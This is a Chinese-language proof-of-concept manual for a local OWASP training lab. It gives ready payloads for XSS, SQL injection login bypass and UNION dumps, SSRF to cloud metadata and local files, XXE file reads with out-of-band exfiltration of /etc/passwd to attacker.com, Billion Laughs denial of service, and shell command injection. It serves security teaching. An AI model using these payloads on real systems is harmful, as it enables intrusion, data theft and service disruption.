# OWASP漏洞实验室 - POC测试手册

## 🌐 服务地址
- **前端应用**: http://localhost:3000
- **后端API**: http://localhost:8080
- **测试账户**: 
  - 管理员: `admin` / `admin123`
  - 普通用户: `john` / `password123`, `jane` / `qwerty`, `bob` / `123456`, `alice` / `password`

---

## 1. 🔴 XSS (跨站脚本攻击)

### 反射型XSS测试
**访问页面**: http://localhost:3000/xss

**测试POC**:
```html
<script>alert('反射型XSS成功!')</script>
<img src=x onerror=alert('反射型XSS成功!')>
<svg onload=alert('反射型XSS成功!')>
<div onmouseover=alert('反射型XSS成功!')>Hover me</div>
<iframe src=javascript:alert('反射型XSS成功!')>
```

**操作步骤**:
1. 在反射型XSS输入框中粘贴任意一个POC
2. 点击"测试反射型XSS"按钮
3. 观察是否弹出alert对话框
4. 检查页面下方是否显示"反射型XSS输出（危险）"区域

### 存储型XSS测试
**测试POC**:
```html
<script>alert('存储型XSS成功!')</script>
<img src=x onerror=alert('存储型XSS成功!')>
<svg onload=alert('存储型XSS成功!')>
```

**操作步骤**:
1. 在存储型XSS评论框中输入POC
2. 填写用户名（如：testuser）
3. 点击"提交评论"按钮
4. 观察是否立即弹出alert对话框
5. 刷新页面，再次观察是否弹出alert对话框（验证存储特性）

### DOM型XSS测试
**测试POC**:
```javascript
alert('DOM XSS成功!')
document.getElementById('output').innerHTML = '<h3>DOM XSS executed!</h3>'
console.log('DOM XSS executed')
```

**操作步骤**:
1. 在DOM XSS输入框中输入JavaScript代码（不是HTML标签）
2. 点击"测试DOM XSS"按钮
3. 观察是否弹出alert对话框

**注意**: DOM型XSS与其他类型不同，它直接执行JavaScript代码，而不是HTML标签。

### ⚠️ XSS测试重要注意事项

1. **执行控制**: 每个XSS类型都有防重复执行机制，如果POC没有执行，请刷新页面后重试
2. **清除评论**: 存储型XSS测试后，建议点击"清除所有评论"按钮清理测试数据
3. **浏览器控制台**: 如果alert被浏览器阻止，请检查浏览器控制台的JavaScript输出
4. **服务状态**: 如果出现400错误，请确保后端服务正常运行（http://localhost:8080）

---

## 2. 💉 SQL注入攻击

**访问页面**: http://localhost:3000/sqli

### 登录绕过攻击
**测试POC**:
```sql
用户名: admin' OR '1'='1' --
密码: anything

用户名: admin'/*
密码: */OR/**/1=1#

用户名: ' OR 1=1 --
密码: 任意值
```

**操作步骤**:
1. 在登录表单的用户名字段输入POC
2. 密码字段输入任意值
3. 点击"登录"按钮
4. 观察是否成功绕过认证并获取用户信息

### 用户信息查询注入
**测试POC**:
```sql
1' AND (SELECT COUNT(*) FROM users) > 0 --
1'; WAITFOR DELAY '00:00:05' --
1' OR 1=1 --
```

**操作步骤**:
1. 在用户ID输入框中输入POC
2. 点击"查询用户"按钮
3. 观察返回的错误信息或延迟响应

### UNION注入攻击
**测试POC**:
```sql
' UNION SELECT id,username,password,email,role,secret FROM users --
' UNION SELECT 1,@@version,3,4,5,6 --
' UNION SELECT 1,database(),3,4,5,6 --
```

**操作步骤**:
1. 在搜索关键词输入框中输入POC
2. 点击"搜索"按钮
3. 观察是否返回数据库中的敏感信息

---

## 3. 🌐 SSRF (服务器端请求伪造)

**访问页面**: http://localhost:3000/ssrf

### 内网探测
**测试POC**:
```
http://localhost:8080/api/ssrf/info
http://127.0.0.1:8080/h2-console
http://127.0.0.1:22
http://127.0.0.1:3306
http://127.0.0.1:80
```

**操作步骤**:
1. 在URL获取输入框中输入POC
2. 点击"获取URL内容"按钮
3. 观察是否成功访问内网服务并返回响应

### 文件读取
**测试POC**:
```
file:///etc/passwd
file:///etc/hosts
file:///proc/version
ftp://internal-server/
```

**操作步骤**:
1. 在URL获取输入框中输入POC
2. 点击"获取URL内容"按钮
3. 观察是否成功读取本地文件内容

### 云服务元数据访问
**测试POC**:
```
http://169.254.169.254/latest/meta-data/
http://httpbin.org/redirect-to?url=http://127.0.0.1:8080
```

**操作步骤**:
1. 在URL获取输入框中输入POC
2. 点击"获取URL内容"按钮
3. 观察是否成功访问云服务元数据

### 图片代理攻击
**测试POC**:
```
http://127.0.0.1:8080/api/ssrf/info
http://localhost:8080/api/users
```

**操作步骤**:
1. 在图片代理输入框中输入POC
2. 点击"代理图片"按钮
3. 观察是否通过图片代理功能访问内网服务

---

## 4. 📄 XXE (XML外部实体注入)

**访问页面**: http://localhost:3000/xxe

### 文件读取攻击
**测试POC**:
```xml
<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>

<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/hosts">]><root>&xxe;</root>

<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///proc/version">]><root>&xxe;</root>
```

**操作步骤**:
1. 选择"DOM4J解析器"或"DocumentBuilder解析器"
2. 在XML内容输入框中粘贴POC
3. 点击"解析XML"按钮
4. 观察是否成功读取系统文件内容

### SSRF通过XXE
**测试POC**:
```xml
<!DOCTYPE root [<!ENTITY xxe SYSTEM "http://127.0.0.1:8080/">]><root>&xxe;</root>

<!DOCTYPE root [<!ENTITY xxe SYSTEM "http://localhost:8080/api/xxe/info">]><root>&xxe;</root>

<!DOCTYPE root [<!ENTITY xxe SYSTEM "http://127.0.0.1:22">]><root>&xxe;</root>
```

**操作步骤**:
1. 在XML内容输入框中粘贴POC
2. 点击"解析XML"按钮
3. 观察是否通过XXE成功访问内网服务

### 参数实体攻击
**测试POC**:
```xml
<!DOCTYPE root [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd"> %xxe;]><root></root>

<!DOCTYPE root [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://attacker.com/?x=%file;'>">%eval;%exfiltrate;]><root></root>
```

**操作步骤**:
1. 在XML内容输入框中粘贴POC
2. 点击"解析XML"按钮
3. 观察参数实体的解析结果

### 拒绝服务攻击 (Billion Laughs)
**测试POC**:
```xml
<!DOCTYPE root [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">]><root>&lol2;</root>

<!DOCTYPE root [<!ENTITY a "dos" ><!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;"><!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;">]><root>&c;</root>
```

**操作步骤**:
1. 在XML内容输入框中粘贴POC
2. 点击"解析XML"按钮
3. 观察是否导致服务器资源消耗过高

---

## 5. ⚡ RCE (远程代码执行)

**访问页面**: http://localhost:3000/rce

### Ping命令注入
**测试POC**:
```bash
127.0.0.1; whoami
127.0.0.1 && id
127.0.0.1 | cat /etc/passwd
127.0.0.1; uname -a
127.0.0.1; ls -la
```

**操作步骤**:
1. 在Ping主机输入框中输入POC
2. 点击"Ping主机"按钮
3. 观察是否成功执行注入的命令并返回结果

### 系统命令执行
**测试POC**:
```bash
whoami
ls -la
ps aux
netstat -an
id
uname -a
cat /etc/passwd
```

**操作步骤**:
1. 在系统命令输入框中输入POC
2. 点击"执行命令"按钮
3. 观察命令执行结果

### 文件操作命令注入
**测试POC**:
```bash
文件名: /etc/passwd; whoami
操作: read

文件名: /etc/hosts && id
操作: list

文件名: /tmp/test.txt | ps aux
操作: stat
```

**操作步骤**:
1. 在文件名输入框中输入包含命令注入的POC
2. 选择相应的文件操作类型
3. 点击"执行文件操作"按钮
4. 观察是否成功执行注入的命令

---

## 🛡️ 安全接口测试

每个漏洞页面都提供了安全版本的接口，用于对比测试：

### 安全功能测试
**操作步骤**:
1. 在各个漏洞页面中找到"安全版本"按钮
2. 使用相同的POC进行测试
3. 观察安全版本如何正确处理恶意输入
4. 对比漏洞版本和安全版本的不同响应

---

## ⚠️ 注意事项

1. **仅在测试环境使用**: 这些POC仅用于学习和测试目的
2. **不要在生产环境测试**: 可能造成数据损坏或系统不稳定
3. **遵守法律法规**: 仅在授权的系统上进行测试
4. **备份数据**: 测试前备份重要数据
5. **监控系统**: 注意系统资源使用情况，避免DoS攻击影响系统稳定性

---

## 🎯 学习目标

通过这些POC测试，你将学会：
- 识别和利用常见的Web安全漏洞
- 理解攻击向量和利用技术
- 掌握安全防护措施的实现
- 提高Web应用安全意识
- 学会进行安全测试和漏洞评估